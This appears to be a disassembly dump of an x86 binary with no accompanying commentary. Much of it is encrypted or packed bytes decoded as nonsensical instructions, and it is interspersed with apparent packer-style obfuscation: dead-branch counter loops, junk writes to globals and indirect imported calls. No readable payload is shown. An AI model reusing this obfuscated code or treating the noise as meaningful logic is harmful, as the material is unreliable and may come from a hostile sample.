  407401:	mov    ecx,0xa950ae94
  407406:	scas   eax,DWORD PTR es:[edi]
  407407:	xchg   BYTE PTR [ebp+0x2a],dl
  40740a:	pop    edx
  40740b:	mov    eax,ds:0x9e3d29c4
  407410:	sbb    BYTE PTR [esi],cl
  407412:	lock or al,0xd7
  407415:	jmp    0x407477
  407417:	dec    DWORD PTR [edi+0x15]
  40741a:	fld    TBYTE PTR [esi-0x52]
  40741d:	mov    edi,0x55e8b37c
  407422:	loop   0x407413
  407424:	cmc    
  407425:	add    ecx,DWORD PTR [esi-0xf8f5259]
  40742b:	sbb    al,BYTE PTR [ebx]
  40742d:	fcmovnb st,st(1)
  40742f:	dec    edx
  407430:	mov    ch,0xbe
  407432:	xor    al,0x79
  407434:	push   ebx
  407435:	pop    esp
  407436:	jo     0x407491
  407438:	xchg   edx,eax
  407439:	sub    cl,BYTE PTR [eax-0x39671503]
  40743f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407440:	xchg   ebx,eax
  407441:	mov    eax,0xab691bfc
  407446:	imul   esp,DWORD PTR [ebx+0x2f],0x34
  40744a:	xchg   ecx,eax
  40744b:	add    dh,BYTE PTR [esi]
  40744d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40744e:	or     al,0xd5
  407450:	js     0x407474
  407452:	mov    ebx,0xe0afea10
  407457:	push   ebx
  407458:	pop    ds
  407459:	outs   dx,DWORD PTR ds:[esi]
  40745a:	push   ecx
  40745b:	pop    eax
  40745c:	pop    eax
  40745d:	xchg   edi,eax
  40745e:	pusha  
  40745f:	dec    ebp
  407460:	popf   
  407461:	in     al,0x31
  407463:	mov    dl,0xda
  407465:	jno    0x4074d5
  407467:	je     0x40747a
  407469:	out    dx,eax
  40746a:	jmp    0xf331:0x3ad5c26
  407471:	mov    esi,DWORD PTR [esi+0x73]
  407474:	pop    ss
  407475:	dec    eax
  407476:	retf   0xb381
  407479:	iret   
  40747a:	push   esi
  40747b:	mov    edi,0x23ca87f3
  407480:	pop    ebp
  407481:	ins    BYTE PTR es:[edi],dx
  407482:	adc    eax,0xf4ed6433
  407487:	pop    ecx
  407488:	adc    DWORD PTR [ebx],esp
  40748a:	rol    BYTE PTR [edx+ebx*8+0x51570b4e],1
  407491:	shr    DWORD PTR [esi+0x4],cl
  407494:	mov    ebx,0x39fb64d5
  407499:	sub    bl,al
  40749b:	cmc    
  40749c:	pop    eax
  40749d:	xor    eax,0x21f83293
  4074a2:	mov    ds:0xa269c294,al
  4074a7:	mov    ebp,DWORD PTR [eax+0x7c3446d5]
  4074ad:	(bad)
  4074b1:	mov    BYTE PTR [ebp-0x2a],0x71
  4074b5:	pop    eax
  4074b6:	cmp    esp,DWORD PTR [edx+esi*2]
  4074b9:	adc    DWORD PTR [esi-0x36],esi
  4074bc:	nop
  4074bd:	or     al,0x44
  4074bf:	adc    DWORD PTR [ecx-0xb9afa59],esi
  4074c5:	push   ebx
  4074c6:	pop    esi
  4074c7:	and    al,0xe3
  4074c9:	and    DWORD PTR [edx],0xffffffc6
  4074cc:	sbb    edx,DWORD PTR [ebx]
  4074ce:	add    BYTE PTR [ecx*8+0xd3f297e],0x1f
  4074d6:	or     bh,BYTE PTR [edi+esi*4-0x7fe65232]
  4074dd:	stos   DWORD PTR es:[edi],eax
  4074de:	xchg   ebp,eax
  4074df:	fsubr  QWORD PTR [esi]
  4074e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e2:	out    0xd3,al
  4074e4:	pusha  
  4074e5:	sbb    eax,0xa3a49004
  4074ea:	push   eax
  4074eb:	ja     0x4074f1
  4074ed:	sbb    al,0x66
  4074ef:	in     eax,dx
  4074f0:	xor    eax,0x48
  4074f3:	in     eax,0x5
  4074f5:	cwde   
  4074f6:	jp     0x4074df
  4074f8:	mov    DWORD PTR [ecx+0x5f],esi
  4074fb:	adc    eax,0x7d2618a5
  407500:	sbb    dl,BYTE PTR [eax+0x67]
  407503:	cli    
  407504:	ret    0xa715
  407507:	sahf   
  407508:	and    bl,bl
  40750a:	dec    eax
  40750b:	aam    0x33
  40750d:	shl    cl,cl
  40750f:	les    edx,FWORD PTR [ebx-0x38fdde3f]
  407515:	pop    es
  407516:	or     BYTE PTR [edi-0x14919ecd],ch
  40751c:	imul   eax,DWORD PTR es:[esi+ecx*2],0x77
  407521:	ss pushf 
  407523:	ds retf 
  407525:	mov    ecx,0x21590caa
  40752a:	xchg   esp,eax
  40752b:	and    eax,DWORD PTR [eax+0x2c5e988d]
  407531:	div    ecx
  407533:	or     eax,0xd2cecc39
  407538:	push   ecx
  407539:	pop    ss
  40753a:	pop    ebp
  40753b:	imul   edx,DWORD PTR [esi],0x836cda5d
  407541:	sub    ah,BYTE PTR [eax-0x37]
  407544:	int3   
  407545:	icebp  
  407546:	xchg   DWORD PTR [eax+0x52],ebp
  407549:	and    BYTE PTR [esi-0x20],cl
  40754c:	dec    esp
  40754d:	dec    edi
  40754e:	mov    ecx,0x79e01c36
  407553:	ret    0xcb95
  407556:	gs in  eax,dx
  407558:	pop    es
  407559:	enter  0x6e0a,0xc7
  40755d:	dec    edx
  40755e:	mov    DWORD PTR [ecx+0xad9f024],edi
  407564:	hlt    
  407565:	cmc    
  407566:	sub    eax,DWORD PTR [edi+0x64883006]
  40756c:	sub    ah,BYTE PTR [ebx-0x14d30848]
  407572:	pushf  
  407573:	in     eax,0x71
  407575:	add    DWORD PTR [edx+edx*2+0x65],eax
  407579:	sbb    dl,dl
  40757b:	or     al,0x55
  40757d:	cld    
  40757e:	cli    
  40757f:	xor    ecx,DWORD PTR [ebx+0x63]
  407582:	xchg   edx,eax
  407583:	mov    ecx,0xfce9ff3b
  407588:	mov    ss,WORD PTR ds:0xe8ce5775
  40758e:	mov    bh,BYTE PTR [ebx-0x504b512d]
  407594:	mov    dl,0x4f
  407596:	hlt    
  407597:	mov    cl,0x90
  407599:	test   BYTE PTR [eax+edx*2],dl
  40759c:	sub    bh,al
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	out    0xf6,al
  407657:	jmp    0x4075e8
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x777e7e7c
  407662:	mov    ebx,0x8a327a5b
  407667:	out    dx,eax
  407668:	cld    
  407669:	(bad)
  40766c:	mov    bh,0xb2
  40766e:	inc    ebp
  40766f:	sbb    al,0x95
  407671:	daa    
  407672:	push   ss
  407673:	inc    ecx
  407674:	xchg   esp,eax
  407675:	jmp    0xd61346bb
  40767a:	and    BYTE PTR [eax-0x78],bh
  40767d:	imul   eax,DWORD PTR [edx+0x1bf18ab3],0x39
  407684:	jl     0x407641
  407686:	xchg   edi,eax
  407687:	sub    ebx,DWORD PTR ds:0x256026da
  40768d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40768f:	push   edi
  407690:	and    ebx,DWORD PTR [ebx]
  407692:	arpl   WORD PTR [ecx+0x536b0c9f],bx
  407698:	mov    dh,0x4e
  40769a:	data16 jp 0x407690
  40769d:	js     0x407705
  40769f:	loop   0x4076fe
  4076a1:	sbb    DWORD PTR [esi+0x4e],0x35
  4076a5:	or     dh,ch
  4076a7:	xor    ecx,DWORD PTR [esp+eiz*8-0x7cf46524]
  4076ae:	data16 xor al,0xd0
  4076b1:	lahf   
  4076b2:	fisubr WORD PTR [edi]
  4076b4:	mov    ebx,0x4159e70f
  4076b9:	outs   dx,BYTE PTR ds:[esi]
  4076ba:	std    
  4076bb:	pop    ebx
  4076bc:	xchg   esi,eax
  4076bd:	dec    esp
  4076be:	inc    ebp
  4076bf:	inc    ecx
  4076c0:	sbb    dl,BYTE PTR [edi+ecx*1+0x4e]
  4076c4:	sti    
  4076c5:	mov    ebx,DWORD PTR [edi-0x5371d641]
  4076cb:	lods   al,BYTE PTR ds:[esi]
  4076cc:	fld    TBYTE PTR [edi+0x1704815e]
  4076d2:	das    
  4076d3:	mov    eax,0x7152c6cd
  4076d8:	in     al,0x88
  4076da:	jnp    0x4076a6
  4076dc:	jae    0x4076be
  4076de:	mov    edx,0x1a731b6f
  4076e3:	or     eax,0x42207c4a
  4076e8:	inc    ebx
  4076e9:	mov    es,WORD PTR [ebx+ebp*4]
  4076ec:	fbld   TBYTE PTR [edx-0x570c32cc]
  4076f2:	push   ebx
  4076f3:	popf   
  4076f4:	dec    edx
  4076f5:	stos   BYTE PTR es:[edi],al
  4076f6:	sbb    eax,0xb5cc440c
  4076fb:	pusha  
  4076fc:	and    al,0x5e
  4076fe:	rcl    DWORD PTR [ecx+0x7b],cl
  407701:	add    ebp,esi
  407703:	push   0x10
  407705:	lods   al,BYTE PTR ds:[esi]
  407706:	pop    esi
  407707:	push   0x51e14e47
  40770c:	dec    ebp
  40770d:	xor    DWORD PTR [ecx+0x47],ebp
  407710:	int    0xda
  407712:	dec    ebp
  407713:	call   0x618d:0x61545c95
  40771a:	add    al,0x96
  40771c:	je     0x407725
  40771e:	push   DWORD PTR ds:0xf98210c8
  407724:	(bad)  
  407725:	clc    
  407726:	inc    eax
  407727:	popa   
  407728:	xchg   edi,eax
  407729:	inc    BYTE PTR [ecx+0x2c]
  40772c:	dec    ecx
  40772d:	push   0x3c
  40772f:	inc    edx
  407730:	stos   DWORD PTR es:[edi],eax
  407731:	gs inc esp
  407733:	call   0xc40b:0xd84de2a6
  40773a:	xchg   edi,eax
  40773b:	dec    eax
  40773c:	inc    ebp
  40773d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40773e:	mov    ebp,ss
  407740:	xor    BYTE PTR [eax-0x4ace1cf2],0xb5
  407747:	jl     0x407711
  407749:	inc    eax
  40774a:	or     DWORD PTR [edx],ecx
  40774c:	jle    0x40774f
  40774e:	add    al,0x40
  407750:	int3   
  407751:	bound  esi,QWORD PTR [esi+0x65]
  407754:	mov    edx,0xab3743f5
  407759:	lock mov eax,ds:0xd63c3ffd
  40775f:	adc    cl,ah
  407761:	pop    ebx
  407762:	shl    DWORD PTR ds:0xcdc8a799,0xb3
  407769:	pop    esi
  40776a:	dec    ebx
  40776b:	xchg   ecx,eax
  40776c:	jle    0x4077ab
  40776e:	dec    esi
  40776f:	xor    al,0x71
  407771:	jo     0x407789
  407773:	in     eax,dx
  407774:	scas   al,BYTE PTR es:[edi]
  407775:	enter  0x2061,0x33
  407779:	xchg   edi,eax
  40777a:	fstp   st(2)
  40777c:	outs   dx,BYTE PTR ds:[esi]
  40777d:	popf   
  40777e:	(bad)
  407783:	xor    bh,BYTE PTR [esi+edi*4]
  407786:	pusha  
  407787:	fcmovnb st,st(4)
  407789:	jo     0x40771f
  40778b:	jp     0x40774b
  40778d:	cmp    ecx,eax
  40778f:	faddp  st(3),st
  407791:	loop   0x407743
  407793:	jb     0x407738
  407795:	int3   
  407796:	cmp    ch,BYTE PTR [eax]
  407798:	mov    ch,0x15
  40779a:	rcl    BYTE PTR [esp+ecx*1-0x129a8d43],cl
  4077a1:	dec    eax
  4077a2:	cmp    DWORD PTR [ecx+0x42],edx
  4077a5:	dec    ebp
  4077a6:	add    ecx,0x253b08ba
  4077ac:	push   esp
  4077ad:	mov    edi,ds
  4077af:	mov    BYTE PTR [esi+0x6f],0x7d
  4077b3:	shl    BYTE PTR [edi],cl
  4077b5:	stos   DWORD PTR es:[edi],eax
  4077b6:	mov    ?,WORD PTR [ebx-0x446b6ca7]
  4077bc:	daa    
  4077bd:	push   edx
  4077be:	mov    bl,0xd2
  4077c0:	aaa    
  4077c1:	aas    
  4077c2:	loop   0x40775a
  4077c4:	je     0x4077af
  4077c6:	pop    DWORD PTR [edx]
  4077c8:	stos   BYTE PTR es:[edi],al
  4077c9:	xchg   ecx,eax
  4077ca:	mov    DWORD PTR [edx+0x31],ebp
  4077cd:	xor    BYTE PTR [edi+0x7d],0xcc
  4077d1:	in     al,0x12
  4077d3:	stos   BYTE PTR es:[edi],al
  4077d4:	pop    ds
  4077d5:	ror    BYTE PTR [ebx-0xbda8443],1
  4077db:	adc    DWORD PTR [ebx+0x7f],ecx
  4077de:	rol    DWORD PTR [esi-0x4efcd13d],cl
  4077e4:	mov    ecx,0x24985ae3
  4077e9:	xor    BYTE PTR [eax+0x6d247179],bl
  4077ef:	dec    edx
  4077f0:	mov    cl,BYTE PTR [edi+0x45]
  4077f3:	sbb    eax,0xd193ad6d
  4077f8:	rcl    DWORD PTR [eax-0x52263a3e],1
  4077fe:	int    0x82
  407800:	sbb    al,0x34
  407802:	inc    eax
  407803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407804:	sub    eax,0x5885b43e
  407809:	fnsave [ebx+0x7cd34084]
  40780f:	jg     0x4077b0
  407811:	lock or al,0x31
  407814:	xor    BYTE PTR [edi],ah
  407816:	xchg   edx,eax
  407817:	jmp    0x4077da
  407819:	mov    ch,0xc0
  40781b:	fucomp st(6)
  40781d:	push   edi
  40781e:	sbb    al,cl
  407820:	xor    ah,BYTE PTR [esi+edi*1-0x10]
  407824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407825:	pusha  
  407826:	cmp    eax,0x634331f7
  40782b:	(bad)  
  40782d:	inc    ebx
  40782e:	dec    ecx
  40782f:	sti    
  407830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407831:	iret   
  407832:	dec    edx
  407833:	xchg   esi,eax
  407834:	std    
  407835:	adc    bh,BYTE PTR [esi-0x72077d2e]
  40783b:	popf   
  40783c:	js     0x407865
  40783e:	pusha  
  40783f:	cli    
  407840:	out    dx,al
  407841:	sub    edx,ebp
  407843:	pushf  
  407844:	pushf  
  407845:	xchg   esp,eax
  407846:	adc    DWORD PTR [ecx+0x3b],ecx
  407849:	add    eax,0x6aaf93b2
  40784e:	lods   al,BYTE PTR ds:[esi]
  40784f:	popa   
  407850:	push   eax
  407851:	in     al,0xb7
  407853:	pop    ss
  407854:	xor    DWORD PTR [edi],0x4e
  407857:	or     BYTE PTR [ebp-0x5d],bh
  40785a:	xchg   ebp,eax
  40785b:	mov    esi,0xfc83e2ad
  407860:	cwde   
  407861:	mov    al,ds:0x697511d5
  407866:	adc    al,0x24
  407868:	inc    ebx
  407869:	mov    edi,0x2b562cd1
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x24,eax
  407922:	ins    DWORD PTR es:[edi],dx
  407923:	xchg   ecx,eax
  407924:	(bad)  
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xd77e7e7c
  40792e:	xor    eax,esp
  407930:	loop   0x407978
  407932:	cmp    BYTE PTR [edi],dl
  407934:	mov    cl,0xe0
  407936:	dec    ebx
  407937:	hlt    
  407938:	lock cmova edi,esi
  40793c:	call   0x6d0b:0x2f041e11
  407943:	add    al,BYTE PTR [esi+0x31]
  407946:	jb     0x40792f
  407948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407949:	popf   
  40794a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40794b:	inc    edi
  40794c:	daa    
  40794d:	mov    esi,0xe1647b4
  407952:	ins    BYTE PTR es:[edi],dx
  407953:	cmp    ebp,DWORD PTR [esi-0x275e74ee]
  407959:	mov    dl,0xa3
  40795b:	shr    BYTE PTR [edi],1
  40795d:	data16 mov cl,0xad
  407960:	hlt    
  407961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407962:	rcr    DWORD PTR [eax+0x47b15438],1
  407968:	icebp  
  407969:	sub    eax,0x1f3eba82
  40796e:	lahf   
  40796f:	out    0x2,eax
  407971:	out    dx,al
  407972:	inc    eax
  407973:	pop    edx
  407974:	hlt    
  407975:	aad    0xd1
  407977:	ror    BYTE PTR [eax-0x50b5dbf0],0xd9
  40797e:	into   
  40797f:	push   ecx
  407980:	adc    BYTE PTR [ecx-0x5d],dl
  407983:	add    DWORD PTR [ebp+0x38],eax
  407986:	mov    ch,0x1e
  407988:	sub    al,0x37
  40798a:	xor    eax,0x84b410a7
  40798f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407990:	jno    0x4079b2
  407992:	mov    ds:0x6dc8aca6,al
  407997:	xor    BYTE PTR [eax-0x143ed6e],cl
  40799d:	cmp    BYTE PTR [ebx+0x5dbae00b],ah
  4079a3:	repz jnp 0x407a1d
  4079a6:	(bad)  
  4079a7:	repnz adc bh,0x1b
  4079ab:	stos   BYTE PTR es:[edi],al
  4079ac:	push   eax
  4079ad:	adc    dl,BYTE PTR [esi+0x2c1512f9]
  4079b3:	jg     0x40798e
  4079b5:	or     al,0x69
  4079b7:	jae    0x40796d
  4079b9:	xor    ebp,0x7d
  4079bc:	iret   
  4079bd:	mov    WORD PTR [ecx+0x5ff832af],?
  4079c3:	sub    cl,dl
  4079c5:	mov    eax,0x98925f79
  4079ca:	mov    ebp,0x409ec7a2
  4079cf:	or     edx,esp
  4079d1:	imul   esp,DWORD PTR [edi+0x3f],0xffffff91
  4079d5:	sbb    DWORD PTR ds:0xd3a7ac93,ebx
  4079db:	shl    DWORD PTR [eiz*1+0x92505da],cl
  4079e2:	js     0x407994
  4079e4:	test   eax,0xbae0b1f7
  4079e9:	mov    al,BYTE PTR [edi]
  4079eb:	test   BYTE PTR [eax+ecx*8-0x3cc5ac7c],dl
  4079f2:	push   edx
  4079f3:	cmc    
  4079f4:	add    bl,BYTE PTR [ecx]
  4079f6:	and    DWORD PTR [edi-0x626f14c],edi
  4079fc:	mov    bh,0x6
  4079fe:	ds xchg edx,eax
  407a00:	push   esi
  407a01:	daa    
  407a02:	or     esi,ebp
  407a04:	inc    edx
  407a05:	popa   
  407a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a07:	add    esp,DWORD PTR [eax]
  407a09:	hlt    
  407a0a:	mov    esp,0x28f32e3a
  407a0f:	jg     0x4079fb
  407a11:	xchg   esp,eax
  407a12:	sub    BYTE PTR [edi],ch
  407a14:	inc    esi
  407a15:	sbb    al,0xb9
  407a17:	push   esi
  407a18:	imul   BYTE PTR [edx+0x66822b21]
  407a1e:	sti    
  407a1f:	retf   
  407a20:	inc    edi
  407a21:	ret    0xa0bd
  407a24:	dec    ebx
  407a25:	cmp    ch,bh
  407a27:	lods   al,BYTE PTR ds:[esi]
  407a28:	adc    eax,0xb7bcaf22
  407a2d:	mov    dl,0xf0
  407a2f:	sub    al,0xe7
  407a31:	test   BYTE PTR [edi],cl
  407a33:	(bad)  
  407a34:	(bad)  
  407a36:	pop    ss
  407a37:	push   cs
  407a38:	lea    esi,[ecx+eax*8]
  407a3b:	ret    
  407a3c:	pop    ebx
  407a3d:	call   0xb35b0559
  407a42:	sub    BYTE PTR [ebx+0x11a76812],0x88
  407a49:	lods   eax,DWORD PTR gs:[esi]
  407a4b:	test   BYTE PTR [ebx-0x78],ch
  407a4e:	cmc    
  407a4f:	add    al,0x9
  407a51:	dec    eax
  407a52:	stos   DWORD PTR es:[edi],eax
  407a53:	or     bh,BYTE PTR [esi-0x25]
  407a56:	lahf   
  407a57:	test   eax,0xf53dca57
  407a5c:	outs   dx,BYTE PTR ds:[esi]
  407a5d:	xchg   esp,eax
  407a5e:	retf   
  407a5f:	push   ss
  407a60:	fcomp  DWORD PTR [esi-0x2c]
  407a63:	adc    eax,0x4e49af2f
  407a68:	fs je  0x407a03
  407a6b:	push   es
  407a6c:	stos   BYTE PTR es:[edi],al
  407a6d:	push   esp
  407a6e:	imul   edx,DWORD PTR [eax+eax*8+0x36d482a2],0x29
  407a76:	icebp  
  407a77:	adc    ebp,ebx
  407a79:	sbb    BYTE PTR [ebx],dl
  407a7b:	xor    BYTE PTR [edx+0x33326471],dl
  407a81:	and    DWORD PTR [ecx-0x42343cd0],eax
  407a87:	push   ds
  407a88:	ret    
  407a89:	das    
  407a8a:	xchg   ecx,eax
  407a8b:	pop    eax
  407a8c:	xor    bh,BYTE PTR [ebp-0x4]
  407a8f:	jmp    0x8a6c90e8
  407a94:	aaa    
  407a95:	iret   
  407a96:	call   0x7b05:0xc77a22ee
  407a9d:	scas   eax,DWORD PTR es:[edi]
  407a9e:	out    0x48,al
  407aa0:	xor    BYTE PTR [edx],bl
  407aa2:	mov    eax,ecx
  407aa4:	dec    edx
  407aa5:	lea    esi,[eax]
  407aa7:	add    eax,0x902f8863
  407aac:	shr    DWORD PTR [edx+0x2b3bf476],cl
  407ab2:	jmp    0x6c02514c
  407ab7:	and    ah,BYTE PTR [eax]
  407ab9:	mov    al,0x1e
  407abb:	ret    0xa883
  407abe:	imul   esi,DWORD PTR [eax-0x6aaf72fb],0xb96b9623
  407ac8:	xchg   esp,eax
  407ac9:	pop    esi
  407aca:	push   ss
  407acb:	clc    
  407acc:	inc    edi
  407acd:	xchg   BYTE PTR [ebx],ch
  407acf:	bound  esp,QWORD PTR [eax-0x1c]
  407ad2:	aam    0x6d
  407ad4:	inc    ecx
  407ad5:	std    
  407ad6:	iret   
  407ad7:	jns    0x407b00
  407ad9:	stos   BYTE PTR es:[edi],al
  407ada:	cwde   
  407adb:	sub    BYTE PTR [esi+0x56e26a08],ah
  407ae1:	sar    DWORD PTR [eax+0x18],cl
  407ae4:	loopne 0x407a96
  407ae6:	inc    edi
  407ae7:	js     0x407aea
  407ae9:	xor    al,BYTE PTR [eax-0x44]
  407aec:	xor    bl,BYTE PTR gs:[esi+0x20]
  407af0:	stc    
  407af1:	and    BYTE PTR [eax],bh
  407af3:	fisubr WORD PTR [ebx]
  407af5:	jb     0x407ae2
  407af7:	mov    bl,0x73
  407af9:	mov    ebp,0xc7232a90
  407afe:	inc    esi
  407aff:	out    dx,al
  407b00:	mov    eax,edi
  407b02:	mov    edx,edi
  407b04:	xor    BYTE PTR [ebx+eax*1],cl
  407b07:	inc    edi
  407b08:	push   es
  407b09:	nop
  407b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b0b:	push   edx
  407b0c:	mov    bl,0x22
  407b0e:	neg    BYTE PTR [ecx]
  407b10:	scas   eax,DWORD PTR es:[edi]
  407b11:	mov    ecx,0xd57c693a
  407b16:	inc    ecx
  407b17:	outs   dx,BYTE PTR ds:[esi]
  407b18:	pop    es
  407b19:	enter  0x498,0xd4
  407b1d:	sbb    edi,DWORD PTR [edx]
  407b1f:	arpl   WORD PTR [eax],ax
  407b21:	mov    esi,0xd0113ccc
  407b26:	call   0xb57c:0x337c2c1
  407b2d:	ret    0x518b
  407b30:	add    dl,BYTE PTR [edi+ebp*2]
  407b33:	mov    bl,0x27
  407b35:	push   0xc13337eb
  407b3a:	adc    DWORD PTR ds:0x43382b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	ins    DWORD PTR es:[edi],dx
  407c4b:	test   BYTE PTR [ecx-0x64],dl
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x397e7e7c
  407c57:	xchg   ebp,eax
  407c58:	push   esi
  407c59:	jno    0x407c71
  407c5b:	repz dec ebx
  407c5d:	retf   
  407c5e:	fs jle 0x407cd4
  407c61:	push   ebp
  407c62:	push   esp
  407c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c64:	adc    ecx,DWORD PTR [eax-0x1e]
  407c67:	(bad)  
  407c68:	xlat   BYTE PTR ds:[ebx]
  407c69:	mov    al,bh
  407c6b:	xchg   edi,eax
  407c6c:	int3   
  407c6d:	pop    esi
  407c6e:	adc    al,0xc2
  407c70:	add    ebx,DWORD PTR [ecx+esi*1+0x7815e498]
  407c77:	push   ebp
  407c78:	fild   WORD PTR [edi+0x19]
  407c7b:	jbe    0x407c1f
  407c7d:	sub    bl,dl
  407c7f:	sbb    DWORD PTR [ebx-0x5f2bab63],ecx
  407c85:	xlat   BYTE PTR ds:[ebx]
  407c86:	xchg   edi,eax
  407c87:	push   ss
  407c88:	or     eax,0x61a3eadf
  407c8d:	lds    eax,FWORD PTR [edi]
  407c8f:	push   0xfc0e8c5d
  407c94:	das    
  407c95:	outs   dx,DWORD PTR ds:[esi]
  407c96:	loop   0x407cf9
